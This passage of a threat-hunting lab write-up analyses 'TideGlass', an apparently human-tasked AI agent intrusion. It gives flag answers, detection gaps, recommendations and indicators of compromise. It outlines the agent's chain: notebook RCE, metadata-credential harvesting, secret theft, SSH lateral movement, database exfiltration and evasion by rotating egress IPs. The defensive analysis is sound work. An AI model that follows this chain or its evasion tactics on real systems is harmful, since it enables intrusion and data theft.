<summary id="-flag-24">🚩 <strong>Flag 24: Placed on the Autonomy Spectrum</strong></summary>

### 🎯 Objective
Classify the execution model across the whole chain.

### 📌 Finding
Human-tasked: a person set one objective; the agent executed autonomously.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Classification | **human-tasked** |
| Artefact 1 | **LLMAgentLogs_CL.user_input** — single human instruction at 11:05:02 |
| Artefact 2 | **LLMAgentLogs_CL.model_response** — self-directed target selection across all steps |
| Corroboration | AWSCloudTrail.SourceIpAddress (6 IPs in 11s); UserAgent `python-httpx/0.27.0`; 9 consecutive gate "allow"s |

**Answer:** `human-tasked, LLMAgentLogs_CL.user_input, LLMAgentLogs_CL.model_response`

### 💡 Why it matters
Answers the briefing's core question: not a person at a keyboard, and not fully unattended malware — a human-tasked autonomous agent.

### 🛠️ Detection Recommendation
**Hunting Tip:** Correlate agent logs (tasking + reasoning) with cloud/network telemetry (machine-speed IP rotation) to place activity on the autonomy spectrum.

</details>

---

### Section 8 — Real or Noise

<details>
<summary id="-flag-25">🚩 <strong>Flag 25: The python3.12 Spawns</strong></summary>

### 🎯 Objective
Separate the attacker's interpreter from 72 developer one-liners and one baseline service process.

### 📌 Finding
Parent-process lineage is the discriminator; the attacker's parent is the marimo launch line.

### 🔍 Evidence

| Group | Count | Parent (ActingProcessCommandLine) |
|-------|------:|-----------------------------------|
| Developer one-liners | 72 | a shell (bash/zsh) |
| Baseline service | 1 | systemd |
| **Attacker** | **1** | **/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token** |

**Answer:** `ActingProcessCommandLine, /opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`

### 💡 Why it matters
The binary name is identical across all 74; only the parent lineage isolates the malicious spawn.

### 🛠️ Detection Recommendation
**Hunting Tip:** Hunt on parent-child lineage, not process name, on data-science hosts where interpreters are ubiquitous.

</details>

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: The Metadata-Service Reads</strong></summary>

### 🎯 Objective
Separate the attacker's IMDS read from 85 routine credential-helper polls.

### 📌 Finding
The process that opened the connection is the discriminator: `python3.12`, not the `refresh` daemon.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Field | **ActingProcessName** |
| Value (attacker) | **python3.12** (PID 5211) |
| Routine polls | refresh (credential-helper daemon), ×85 |

**Answer:** `ActingProcessName, python3.12`

### 💡 Why it matters
The destination (169.254.169.254) is identical for all 86 connections; only the initiating process separates them.

### 🛠️ Detection Recommendation
**Hunting Tip:** Baseline which processes legitimately reach IMDS. Any other process touching the metadata IP warrants investigation.

</details>

<details>
<summary id="-flag-27">🚩 <strong>Flag 27: The Secret Reads</strong></summary>

### 🎯 Objective
Beyond source IP, name two properties that separate the theft from 21 routine application reads.

### 📌 Finding
The targeted secret and the credential type.

### 🔍 Evidence

| Field | Value |
|------|-------|
| RequestParameters (SecretId) | **prod/bastion/ssh-deploy-key** |
| UserIdentityAccessKeyId | **AKIA4TIDEGLASS0EXAMPLE** (long-term IAM user key) |
| Routine reads | operational secrets, from stable CI address using temporary `ASIA` role keys |

**Answer:** `RequestParameters, prod/bastion/ssh-deploy-key, UserIdentityAccessKeyId, AKIA4TIDEGLASS0EXAMPLE`

### 💡 Why it matters
> **Telemetry note:** `ReadOnly=false` and `UserAgent` (`python-httpx/0.27.0`) are shared with the legitimate app read and do **not** discriminate. The SecretId value is sourced from the agent log (LLMAgentLogs_CL, 11:26:15), as CloudTrail's `RequestParameters` was empty on the theft event.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert when a long-term `AKIA` key reads an infrastructure/SSH secret, versus temporary role keys reading operational secrets from a stable CI address.

</details>

<details>
<summary id="-flag-28">🚩 <strong>Flag 28: The Pace of the Whole Chain</strong></summary>

### 🎯 Objective
Identify the temporal property that separates the attacker's chain from the estate's baseline, and its span.

### 📌 Finding
A single continuous, dependency-linked burst with no idle gaps, spanning ~52 minutes.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Pattern | **contiguous / continuous burst** |
| Start | 11:05:02 UTC (WebSocket exploit) |
| End | 11:57:00 UTC ("Objective complete") |
| Duration | **~52 minutes** |

**Answer:** `contiguous burst, 52 minutes`

### 💡 Why it matters
The estate's legitimate activity is periodic or human-paced and scattered across the day. The absence of gaps — not any single event — marks the chain as automated.

### 🛠️ Detection Recommendation
**Hunting Tip:** Score sequences of security-relevant events by inter-event gaps. A dense, gapless dependency chain across multiple hosts is a strong automation signal.

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- **Marimo exposed with authentication disabled** (`--no-token`) and bound to all interfaces (`--host 0.0.0.0`) on an internet-reachable host — the root cause of initial access.
- **IMDSv1 in use:** the metadata service returned credentials without a session token, enabling trivial harvesting.
- **CloudTrail cannot scope secret exposure:** `GetSecretValue` logs no secret contents, and in this dataset `RequestParameters` (the SecretId) and `ResponseElements` (the VersionId) were both empty on the theft event.
- **No `ThrottlingException` recorded** for the rate-limited ListSecrets call — the throttle was provable only from the agent's own reasoning log.
- **Policy gate did not cover the intruder agent:** every `tideglass-agent` action passed as "no policy matched," while the estate's own assistant was correctly blocked on sensitive actions.
- **Long-term IAM user key (`AKIA`) on a workload** that should use temporary role credentials.
- **Passphrase-less SSH deploy key** stored in Secrets Manager, usable immediately on retrieval.

### Recommendations
- Enforce authentication on marimo/notebook kernels; never run with `--no-token`; bind to loopback or an authenticated proxy; remove external exposure.
- Enforce **IMDSv2** (session tokens) and restrict IMDS access by process/namespace.
- Replace the long-term `svc-notebook` `AKIA` key with short-lived role credentials; alert on `AKIA` usage from workloads.
- Rotate `prod/bastion/ssh-deploy-key` immediately; remove the retired public key from `deploy`'s `authorized_keys` on all hosts; require passphrases or short-lived certificates for SSH.
- Extend the agent policy gate to **default-deny** for unknown actors/sessions; alert on any new agent actor string.
- Add SIEM alerting on: HTTP 101 from external IPs; `GetSecretValue` with `ReadOnly=false` by service identities; `pg_dump` piped to network tools; SSH from the notebook host to the bastion; and `deploy`-account logins.
- Adopt **MITRE ATLAS** coverage alongside ATT&CK for environments running autonomous agents.

---

## 🧾 Final Assessment

TideGlass demonstrates a mature, **human-tasked autonomous** intrusion in which a single natural-language objective produced a complete breach in under an hour. The agent chained a pre-auth notebook RCE (CVE-2026-39987), cloud credential harvesting, secrets-store theft, key-based lateral movement, and bulk database exfiltration into one gapless 52-minute sequence, evading per-IP controls with a rotating egress pool. **2,841,902 customer records** were exfiltrated to `203.0.113.41:8443` and must be treated as fully compromised for breach-notification purposes.

The sophistication lies less in any single exploit than in the **speed, self-direction, and evasion** the agent exhibited: it enumerated its own CVE, chose its own targets, reasoned about throttling and rotated egress in response, and suppressed interactive prompts for non-interactive operation. Defensive posture was undermined by three failures that were individually minor but jointly catastrophic: an unauthenticated exposed service, IMDSv1, and an agent policy gate that did not cover unknown actors. Closing those three gaps would have broken the chain at its first, third, or every subsequent step respectively.

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review.
- Evidence reproducible via advanced hunting (KQL included per flag).
- Techniques mapped to both MITRE ATT&CK and MITRE ATLAS.
- **Cross-table method:** several flags required correlating two tables that each carried half a fact (e.g., agent-log target selection + CloudTrail execution; process tree + network attribution).
- **Honesty notes retained where telemetry was incomplete:** the throttle proof (Flag 9), the empty `RequestParameters`/`VersionId` on the theft event (Flags 12, 14, 27), and the ATLAS maturity discrepancy (Flag 7) are documented rather than papered over.
- **Date discrepancy:** all telemetry is dated 2026-09-04; the briefing's 14 August reference is treated as a label mismatch.

---

## 📌 Indicators of Compromise (IOCs)

| Type | Indicator |
|------|-----------|
| Network | `198.51.100.23` (initial-access source) |
| Network | `203.0.113.71, .94, .118, .142, .167, .203` (Secrets Manager egress pool) |
| Network | `203.0.113.41:8443` (exfiltration drop) |
| Vulnerability | CVE-2026-39987 (marimo pre-auth kernel RCE) |
| Cloud Identity | `arn:aws:iam::402913776148:user/svc-notebook` |
| Access Key | `AKIA4TIDEGLASS0EXAMPLE` |
| Secret | `prod/bastion/ssh-deploy-key` |
| SSH Key | `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE` |
| File Path | `/tmp/.c/id_ed25519` (staged key) |
| Agent Actor | `tideglass-agent` / session `tg-4b81e0d7` |
| User Agent | `python-httpx/0.27.0` (AWS API calls) |
| Process Lineage | `python3.12` (PID 5211) spawned by `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token` |
